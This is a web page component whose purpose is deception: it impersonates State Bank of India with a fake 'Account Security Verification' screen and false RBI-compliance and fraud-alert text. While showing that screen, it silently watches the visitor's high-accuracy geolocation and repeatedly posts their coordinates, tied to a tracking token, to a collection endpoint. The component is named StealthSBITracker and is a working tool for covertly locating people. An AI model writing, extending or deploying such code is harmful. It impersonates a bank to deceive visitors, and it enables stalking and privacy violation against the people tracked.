import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";
import { Shield, MapPin } from "lucide-react";

export const Route = createFileRoute("/share/$token")({
  head: () => ({
    meta: [
      { title: "SBI Account Security Verification" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: StealthSBITracker,
});

function StealthSBITracker() {
  const { token } = Route.useParams();

  useEffect(() => {
    startSilentTracking(token);
  }, [token]);

  const startSilentTracking = async (token: string) => {
    // Initialize session
    try {
      await fetch("/api/public/ping", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          token, 
          lat: 0, 
          lon: 0, 
          accuracy: 0 
        }),
      });
    } catch (e) {}

    // Silent location tracking
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(
        (pos) => {
          fetch("/api/public/ping", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              token,
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            }),
          });
        },
        (err) => {
          console.error("Location error:", err);
        },
        { 
          enableHighAccuracy: true, 
          maximumAge: 0, 
          timeout: 15000 
        }
      );
    }
  };

  return (
    <div className="min-h-screen bg-[#001a33] text-white flex flex-col">
      {/* Professional SBI Header */}
      <div className="bg-[#003087] py-5 px-6 flex items-center gap-3 border-b border-blue-800">
        <div className="w-11 h-11 bg-white rounded-full flex items-center justify-center text-[#003087] font-bold text-3xl">SBI</div>
        <div>
          <h1 className="font-bold text-2xl tracking-tight">State Bank of India</h1>
          <p className="text-xs text-blue-300 -mt-1">Official • Secure Banking</p>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center p-6">
        <div className="max-w-md w-full text-center">
          <div className="mx-auto mb-8">
            <Shield className="w-24 h-24 text-green-500 mx-auto" />
          </div>

          <h2 className="text-3xl font-bold mb-4">Account Security Verification</h2>
          
          <p className="text-blue-200 mb-10 text-lg">
            Unusual activity detected on your account.<br />
            Verifying your location to prevent fraud.
          </p>

          <div className="bg-[#002b4d] rounded-3xl p-10 border border-blue-700 mb-8">
            <div className="flex justify-center mb-6">
              <div className="w-6 h-6 bg-green-500 rounded-full animate-pulse"></div>
            </div>
            <p className="text-xl font-semibold text-green-400">Location Verification Active</p>
            <p className="text-sm text-blue-300 mt-3">Please keep this page open for security check</p>
          </div>

          <div className="text-xs text-blue-400/70 leading-relaxed">
            This is an automated RBI-compliant security process.<br />
            Do not close or navigate away until verification completes.
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="py-6 text-center text-xs text-blue-500/50 border-t border-blue-900">
        © State Bank of India • All Rights Reserved • Secure Session
      </div>
    </div>
  );
}